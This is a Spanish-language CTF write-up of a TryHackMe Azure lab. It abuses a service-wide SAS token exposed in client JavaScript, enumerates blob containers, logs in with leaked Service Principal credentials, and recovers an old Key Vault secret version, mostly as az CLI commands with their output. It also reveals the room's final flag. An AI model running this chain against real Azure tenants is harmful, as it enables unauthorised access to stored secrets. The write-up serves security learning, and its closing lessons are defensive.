---
layout: post
title: "CryptoCabana — TryHackMe (Hacker Holidays 2026)"
date: 2026-08-04
categories: [CTF, TryHackMe]
tags: [azure, sas-token, key-vault, blob-storage, tryhackme, service-principal]
---

# CryptoCabana — TryHackMe (Hacker Holidays 2026)

**Categoría:** Cloud
**Dificultad:** Medium
**Plataforma:** Microsoft Azure (Static Website, Blob Storage, Key Vault)

## Resumen

CryptoCabana es un reto de la categoría Cloud del evento Hacker Holidays 2026 de TryHackMe, ambientado como un kiosko de backup de seed phrases de criptomonedas. La sala pone a prueba la explotación de una cadena de fallos de configuración comunes en entornos Azure: exposición de un **SAS token** con permisos excesivos en el código del lado del cliente, enumeración de contenedores de **Blob Storage**, filtración de credenciales de un **Service Principal**, y finalmente el abuso del historial de versiones de secretos en **Azure Key Vault** para recuperar un valor "rotado".

**Flag final:** `THM{n0t_ur_k3ys_n0t_ur_c01ns!}`

## Objetivo

> Find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends.

Target inicial: `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`

## Preparación

El reto requiere Azure CLI. En Fedora se instala directamente desde los repositorios:

```bash
sudo dnf install -y azure-cli
az --version
```

## Paso 1 — Reconocimiento del sitio estático

El target es un **Azure Static Website** (identificable por el sufijo `z13.web.core.windows.net`). Antes de interactuar con el formulario visible, se revisó el código fuente de la página:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

La página presenta un formulario de "backup de seed phrase" que, según el HTML, carga un script adicional:

```html
<script src="app.js"></script>
```

## Paso 2 — SAS token expuesto en el cliente

Al descargar `app.js`, se encontró que el "backup" del formulario se realiza directamente desde el navegador hacia Azure Blob Storage, usando un **SAS token (Shared Access Signature)** embebido en el propio JavaScript:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

Analizando los parámetros del SAS:

| Parámetro | Valor | Significado |
|---|---|---|
| `ss` | `b` | Servicio: Blob |
| `srt` | `sco` | Alcance: **s**ervice, **c**ontainer, **o**bject |
| `sp` | `rl` | Permisos: **r**ead, **l**ist |
| `se` | `2099-12-31` | Expiración: prácticamente nunca |

El detalle crítico es `srt=sco`: el token no está limitado al blob o contenedor que la app usa (`backups`), sino que tiene alcance a nivel de **servicio completo**, permitiendo listar *todos* los contenedores de la cuenta de almacenamiento — mucho más de lo que el flujo visible de la aplicación sugiere.

## Paso 3 — Enumeración de contenedores

Usando el SAS token contra el endpoint de servicio de Blob Storage:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

O de forma más cómoda con Azure CLI:

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..." \
  --output table
```

Resultado:

```
Name     Lease Status    Last Modified
-------  --------------  -------------------------
$web                     2026-07-16T18:26:22+00:00
backups                  2026-07-16T18:26:22+00:00
vault
```

El contenedor `vault` nunca es referenciado por la aplicación pública — es la "trust" a la que apunta el itinerario del reto.

## Paso 4 — Contenido del contenedor `vault`

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "..." \
  --output table
```

```
Name                         Blob Type    Length    Content Type
---------------------------  -----------  --------  ------------------------
backup-service-account.json  BlockBlob    360       application/json
seed_phrase.txt              BlockBlob    88        application/octet-stream
```

Se descargaron ambos blobs:

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc --container-name vault \
  --name backup-service-account.json --sas-token "..." \
  --file backup-service-account.json
```

`seed_phrase.txt` resultó ser un señuelo (una seed phrase de ejemplo). El archivo interesante fue `backup-service-account.json`, que contiene credenciales completas de un **Service Principal** de Azure AD:

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "REDACTED",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

## Paso 5 — Autenticación como Service Principal

```bash
az login --service-principal \
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  --password "<client_secret>" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

El login fue exitoso, confirmando que el secreto filtrado seguía siendo válido a pesar de la nota de "rotar si sale del vault".

## Paso 6 — Enumeración de Azure Key Vault

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
```

```
Name         Enabled    Expires
-----------  ---------  -------------------------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True       2020-01-01T00:00:00+00:00
```

Lectura de cada secreto:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query value -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name master-key  --query value -o tsv
```

- `key-shard-1` → `THM{n0t_ur`
- `key-shard-3` → `ur_c01ns!}`
- `key-shard-2` → un mensaje en vez del valor real: *"Rotated this after IT flagged it — old value should still be recoverable if you know where to look."*
- `master-key` → `403 Forbidden (ForbiddenByRbac)`. El Service Principal no tiene el rol RBAC necesario para leer este secreto; no fue necesario para completar el reto, pero representa una vía adicional de escalada de privilegios fuera del alcance de esta flag.

## Paso 7 — Explotando el historial de versiones de Key Vault

Azure Key Vault versiona automáticamente cada secreto. Rotar un valor no elimina las versiones anteriores por defecto — solo cambia cuál es la "versión actual". Se listaron las versiones de `key-shard-2`:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output json
```

Se identificaron dos versiones, y se recuperó el valor de la más antigua:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0 \
  --query value -o tsv
```

Resultado: `_k3ys_n0t_`

## Flag final

Uniendo los tres fragmentos:

```
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

Un guiño directo al dicho clásico de criptomonedas *"not your keys, not your coins"*.

## Conclusiones y lecciones de seguridad

1. **Los SAS tokens deben tener el alcance mínimo necesario.** Un token pensado solo para subir archivos a un contenedor específico (`sp=cw` a nivel de objeto) nunca debería tener `srt=sco` con permiso de `list` a nivel de servicio — eso convierte un simple formulario de "backup" en una puerta de enumeración de toda la cuenta de almacenamiento.
2. **Nunca embeber secretos ni tokens de larga duración en código del lado del cliente.** Cualquier cosa en JavaScript servido al navegador es pública por definición, sin importar cuán "oculta" parezca.
3. **Rotar un secreto no es suficiente si no se revocan/eliminan las versiones anteriores.** Azure Key Vault conserva el historial de versiones por diseño; si un secreto se filtró, hay que deshabilitar o purgar explícitamente las versiones antiguas, no solo generar una nueva.
4. **El principio de menor privilegio en RBAC funcionó como red de seguridad parcial** en este caso (el bloqueo a `master-key`), mostrando el valor de segmentar permisos incluso cuando un secreto de autenticación se filtra.

---
*Writeup por Cristhian — Hacker Holidays 2026, TryHackMe*
